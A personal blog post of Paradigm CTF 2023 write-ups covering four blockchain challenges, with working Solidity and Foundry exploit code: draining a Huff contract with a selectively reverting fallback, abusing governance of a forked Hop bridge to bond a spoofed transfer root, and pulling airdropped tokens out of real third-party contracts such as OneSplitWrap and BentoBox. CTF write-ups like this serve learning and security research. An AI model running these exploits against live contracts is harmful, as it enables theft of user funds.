---
title: 🍳 Paradigm CTF 2023 Writeups 
author: Ashiq Amien
date: 2023-10-31 12:45:00 +0200
categories: [CTF, Blockchain]
tags: ctf
math: true
---

## Black Sheep

We're given the [following huff code](https://gist.github.com/toastedsteaksandwich/3d9bad0bb4952da766f9e2b3e00bac80) and the goal of the challenge was to drain the contract of its balance. I've never worked with [huff](https://huff.sh/) before, but it's fairly intuitive to read even with just a little bit of assembly experience. From a quick run through, the contract performs to checks `CHECKVALUE()` and `CHECKSIG()`. The `CHECKVALUE()` macro checks that the value is less than 0x1 (i.e. 16 wei) and if it is, it returns double that back to the caller. The `CHECKSIG()` macro loads the `withdraw()` function parameters and performs a call to `address(0x1)`, which is the `ecrecover` precompile. 

Since I was unfamiliar with huff and how to test it, I decided to use `huffc` to compile the code into bytecode and use [EVM playground](https://www.evm.codes/playground?fork=shanghai) to step through it. I encoded a `withdraw(bytes32, uint8, bytes32, bytes32)` call with arbitrary params and stepped through it with a wei value of 15. Down the line, I noticed that the solve was dependent on not jumping in the `iszero iszero noauth jumpi` instruction. This meant that `iszero iszero` needed to return 0, meaning that the top of the stack (the input) needed to be 0. 

![Checking da stack](/assets/img/sample/paradigmctf2023/sheep.png)

After some sifting, I noticed that this wasn't dependent on `CHECKSIG()`, but rather the return of the call in `CHECKVALUE()`. To get a 0 return from a call, we need to revert when the contract calls back, which could be done in the fallback:

```javascript
    fallback() payable external{                
        revert();        
    }
```
But since we need to receive the full balance with the `selfbalance` call in `WITHDRAW()`, we need to edit the fallback to only revert as needed, and the challenge is solved.

```javascript
    fallback() payable external{                
        if(msg.value == 30 wei){revert();}        
    }
```

## Hopping into place

The following setup contract was given:

```javascript
    BridgeLike private immutable BRIDGE = BridgeLike(0xb8901acB165ed027E32754E0FFe830802919727f);

    function deploy(address system, address player) internal override returns (address challenge) {                
        ...
        BRIDGE.setGovernance(player);
        ...
    }}
```
The contract provided is the Hop bridge contract, and the environment is forked from mainnet. As part of the challenge, we're given governance privileges and the goal was to drain the bridge. Looking at the code on etherscan, we can see there's a few governance functions to use:

![we like the governance role](/assets/img/sample/paradigmctf2023/gov.png)



When trying to figure out how to drain the contract, there's a main exit point that allows anyone to withdraw their funds through a function called `withdraw()`. The withdraw was dependent on whether or not the user's bridged withdrawal was part of a merkle tree belonging to some root (here, known as a transfer root). One way transfer roots are set is through the `bondTransferRoot()` function, only accessible by bonders, a special role in the contract. However, since we have governance privs, we can assign the bonder role freely. 

![add a bonder](/assets/img/sample/paradigmctf2023/bonder.png)
![what could go wrong](/assets/img/sample/paradigmctf2023/bondtransferroot.png)


Looking closely, there's a `requirePositiveBalance` modifier defined in the `Accounting` contract as:

```javascript
modifier requirePositiveBalance {
    _;
    require(getCredit(msg.sender) >= getDebitAndAdditionalDebit(msg.sender), "ACT: Not enough available credit");
}
```

When I tried to bond a transfer root with the full bridge balance, this modifier was triggered and the requirement failed. I didn't expect to see the error since I couldn't find any issues down the code path when looking around on etherscan, but after some digging, I found an overridden  `_additionalDebit()` function that was part of the code path that I didn't pick up initially:

```javascript
function _additionalDebit(address bonder) internal view override returns (uint256) {
    uint256 currentTimeSlot = getTimeSlot(block.timestamp);
    uint256 bonded = 0;

    uint256 numTimeSlots = challengePeriod / TIME_SLOT_SIZE;
    for (uint256 i = 0; i < numTimeSlots; i++) {
        bonded = bonded.add(timeSlotToAmountBonded[currentTimeSlot - i][bonder]);
    }

    return bonded;
}
```

We need this function to return 0, which is possible if `numTimeSlots` is 0; this prevent the for-loop from running. Since we have governance privs to set the `challengePeriod` to 0 with `setChallengePeriod()`, we can get `numTimeSlots` to be 0 and bypass the `requirePositiveBalance` modifier and set a transfer root. 

The rest of the exploit is just filling up the params. We want to set up a transfer root, where the merkle tree is just a single node (and therefore just the root). This passes all of the checks in the `verify()` function because we have `1>0` total leaves, index `0<1` and `_siblings.length == _ceilLog2(_totalLeaves)` since we have no siblings:

```javascript
require(
    _totalLeaves > 0,
    "Lib_MerkleTree: Total leaves must be greater than zero."
);

require(
    _index < _totalLeaves,
    "Lib_MerkleTree: Index out of bounds."
);

require(
    _siblings.length == _ceilLog2(_totalLeaves),
    "Lib_MerkleTree: Total siblings does not correctly correspond to total leaves."
);

bytes32 computedRoot = _leaf;
```

The final exploit is below:

```javascript
function run() public {
    uint256 deployerPrivateKey = vm.envUint("KEY");
    vm.startBroadcast(deployerPrivateKey);
    player = IBridge(bridge).governance();
    bonder = new HopBonder{value: 1 ether}();                
    bridge.addBonder(address(bonder));
    bridge.setCrossDomainMessengerWrapper(10, address(bonder));
    bridge.setChallengePeriod(0); 
    IChal chal = IChal(0xeAa2d400654bE3a41fC09C2a585aada5A2399055);                      
        uint256 bridgeId = bridge.getChainId();
        uint256 bridgeBal = address(bridge).balance;                    
        bytes32 spoofTx = keccak256(abi.encode(
        1,
        alice,
        bridgeBal,
        bytes32(0),//transferNonce,
        0,//bonderFee,
        0,//amountOutMin,
        0//deadline
    ));                   
    bonder.kick(spoofTx, bridgeId, bridgeBal, address(bridge), alice);         
    console.log("solved? %s", chal.isSolved());
}
```
```javascript
function kick(bytes32 rootHash, uint256 chainId, uint256 totalAmount, address bridge, address recipient) public {     
    IBridge(bridge).bondTransferRoot(rootHash, 1, totalAmount);     
    IBridge(bridge).withdraw(recipient, totalAmount, bytes32(0), 0,0,0,rootHash,totalAmount,0,sibs,1);
}  
```

This chal was fun, I looked at hop code sometime last year so it was cool to revisit it :)

## Free Real Estate

This was a koth (King of the Hill) challenge, meaning that the total points is split according to how well you score in the challenge. In this case, there was an airdrop and the score was dependent on how many tokens you could grab:

```javascript
function getScore() external view returns (uint256) {
    return IERC20(MERKLE_DISTRIBUTOR.token()).balanceOf(address(this)) / 1 ether;
}
```
The airdrop details were as follows:

```javascript
The INU airdrop follows rules similar to the original UNI airdrop:

1. Reward 10,000 INU to each eligible address that redeemed SOCKS or holds SOCKS
2. Reward 400 INU to each eligible address that has performed a swap on Uniswap 1, 2, or 3
3. Reward Uniswap LPs as follows:
    i. allocate 50M + 50M + 50M INU to LPs of Uniswap 1 / 2 / 3
    ii. distribute rewards across pools pro rata based on number of historical swaps per pool
    iii. within each pool, distribute rewards to eligible LPs pro rata based on the total amount minted by each LP

Only a subset of addresses are eligible:
- must not be an EOA
- must not be a Gnosis Safe

This results in a total allocation of 214M INU across 146K eligible addresses.
```
Immediately after reading the criteria, there were a few contracts that came to mind such as the Uniswap universal router, multicall, bentobox, etc. These contracts allow users to either sweep tokens or perform arbitrary calls, which could be used to send the tokens to the challenge contract. I also figured I could look through arbitrary call exploit contracts. However, there as 146k addresses and merkle proofs to search through. I didn't feel like figuring out the bash-fu to do it myself, so I recruited chatGPT which came out with a way for me to extract what I need given an address:

```bash
$ cat airdrop-merkle-proofs.json | jq -r '.claims' | jq -r 'to_entries[] | select(.key | contains("00000000000003441d59DdE9A90BFfb1CD3fABf1"))'
{
  "key": "0x00000000000003441d59DdE9A90BFfb1CD3fABf1",
  "value": {
    "index": 2,
    "amount": "0x15af1d78b58c400000",
    "proof": [
      "0x17813d76ac9c52a461d9f52dec5f879a764939b9d6b5f98ca7a778e6957e3bd4",
      "0x66d18930fce82e15b5ec32021b091f02d90cc5dfff4cb955651cb39ac0ffefca",
      ...
      "0x05d87b90d16d65eca608285be05f09d6be06ed26e996e2b0f51b3aa33aaa78eb",
      "0xc61672b51620329157c09e93120384c7e539511991bb6ef9fc37f570f220f2f9"
    ]
  }
}
```

In this way, I could figure out the amount of tokens the address was allocated, and get the merkle proof if I see that I can claim and transfer it. The contracts that came to mind earlier had all tokens allocated, but it was nothing in comparison (400-800 tokens) to the leaderboard (in the millions):

![maybe they shouldn't have left the score up?](/assets/img/sample/paradigmctf2023/scores.png)

I figured it made sense to at least target the address that gave 4 different teams ~1.5m tokens, so I consulted chatGPT again to give me a script to pull the top balances in the json. Immediately I could see the address the other teams targeted:

```python
Rank 1: Address: 0xa57Bd00134B2850B2a1c55860c9e9ea100fDd6CF , Amount: 13511214999999999406768128 WEI
Rank 2: Address: 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 , Amount: 11609790999999998999920640 WEI
...
Rank 18: Address: 0x67668e84E7Ebfd5Aa92eE8ab2aDCc9BAf9698ccD , Amount: 1537158999999999903793152 WEI
...

```

The `0x67` address was the `OneSplitWrap` contract, which from a glance looked like a helper contract to split trades between several dexes. More importantly, there was a `swap()` function that sent over the full balance of a token we specifiy, which is exactly what the challenge is asking for. 

![what could go wrong](/assets/img/sample/paradigmctf2023/free-drops.png)

Following the logic of the swap, we can simply swap nothing (token address as `address(0)`) and ask for the airdropped token as the token out. The full claim and swap is as follows:

```javascript
bytes32[] memory splitproof = new bytes32[](18);
splitproof[0] = bytes32(0x23a...73c);
    ...
splitproof[17] = bytes32(0xc61...2f9);

distro.claim(59247, 0x67668e84E7Ebfd5Aa92eE8ab2aDCc9BAf9698ccD, 1537158999999999903793152, splitproof);

IOneSplit onesplit =  IOneSpli(0x67668e84E7Ebfd5Aa92eE8ab2aDCc9BAf9698ccD);        
uint256[] memory flags = new uint256[](1);flags[0] = 1;
onesplit.swap(IERC20(address(0)), token, 0, 0, flags, 0);    
token.transfer(address(chal), 1537158999999999903793152;                     
         
```

All good so far. But I noticed that the `statemind` team had 10m tokens, and since I already had a set up for the challenge, I figured I'd try to go for the 10m. Subtracting their score from mine, I saw there was a 9223254 difference. Luckily for me, there was an address with a very similar balance!

```bash
Rank 5: Address: 0x97402249515994Cc0D22092D3375033Ad0ea438A , Amount: 9222053999999999885180928 WEI
```

This contract was behind a proxy, and looked like a Uniswap V1 helper to buy some tokens from a pool and add liquidity with ETH and the bought tokens. More importantly, the contract uses its token balance when adding liquidity. The idea to get our airdroped tokens was as follows:

- Claim a small amount of tokens
- Register a pool for the tokens and add some liquidity
- Send in a large amount of ETH to the help and have it buy up tokens and add liquidity 
- Remove the liquidity from Uniswap and send the tokens to the challenge contract

For the small amount of tokens, I claimed from [`BentoBox`](https://etherscan.io/address/0xF5BCE5077908a1b7370B9ae04AdC565EBd643966) which had 800 tokens. The rest of the exploit (theft?) is below:

```javascript
bytes32[] memory bentoproof = new bytes32[](18);            


bentoproof[0] = bytes32(0xcdc...b28);
...
bentoproof[17] = bytes32(0xc61...2f9);
distro.claim(116047, 0xF5BCE5077908a1b7370B9ae04AdC565EBd643966, 800000000000000000000, bentoproof);
IBento bento = IBento(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
bento.deposit(token, address(bento), 0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88, token.balanceOf(address(bento)), 0);
bento.withdraw(token, 0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88, 0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88, token.balanceOf(address(bento)), 0);
    
bytes32[] memory proof = new bytes32[](18);            
proof[0] = bytes32(0x1b9...08a);   
proof[17] = bytes32(0xc61...2f9);

distro.claim(86395, 0x97402249515994Cc0D22092D3375033Ad0ea438A, 9222053999999999885180928, proof);

ILiqZap liqzap =  ILiqZap(0x97402249515994Cc0D22092D3375033Ad0ea438A);          
IExchange exchange = IExchange(factory.createExchange(address(token)));    
token.approve(address(exchange), type(uint256).max);
exchange.addLiquidity{value: 0.001 ether}(0, 0.001 ether, type(uint256).max);  

liqzap.LetsInvest{value: 100 ether}(address(token), 0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88);                                               
    
exchange.removeLiquidity(exchange.balanceOf(0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88), 1, 1, type(uint256).max);
token.transfer(address(chal), token.balanceOf(0x60F2C887d59c388DB03c3738B04BfCc6e07F3D88));    

```

This challenge was super fun, and I thought it was a cool creative twist to the usual pwn chals :)


## Enterprise blockchain

So I didn't get the points for this challenge, but after skimming the solutions, it seems that I was close (or had the solution, but for some reason did something wrong somewhere else. idk, my brain was cooked by this stage 😂)

For this challenge, a relayer was set up between two chains and a simple bridge contract was deployed on both. The goal was to drain at least 10 of the 100 tokens on the bridge. The bridge allows anyone to send arbitrary messages to the other bridge, which makes the exploit straight forward. That is, send in a payload from L2 to L1 with an encoded transfer call to the token contract to drain the amount needed. I initially tried this with the following code:

```javascript
bytes memory data = abi.encodeWithSignature("transfer(address,value)", me, 1 wei);
bridge.sendRemoteMessage(78704, address(token), data);   
```
```bash
$ forge script script/EnterpriseSolve.s.sol --rpc-url http://enterprise-blockchain.challenges.paradigm.xyz:8545/<id>/l2 --broadcast -vvvv
```

I then checked to see if anything was transferred:

```bash
$ cast call <token-address> "balanceOf(address)" <bridge-address> --rpc-url http://enterprise-blockchain.challenges.paradigm.xyz:8545/<id>/l1
```

And for whatever reason, the balance was not updated. I may have screwed up by mixing the token and bridge address, or didn't copy the RPC URL correctly, or just something else, but this was in-line with the solution (apparently). We'll get it right next time 😬


---
Big thanks to [@paradigmctf](https://twitter.com/paradigm_ctf?lang=en) for another great CTF! I was definitely a bit rusty, and towards the end my brain turned into scrambled eggs. I'm thinking I might try joining a team next time, even if I can't commit to a full weekend like it was in this case. Send a DM if you're keen!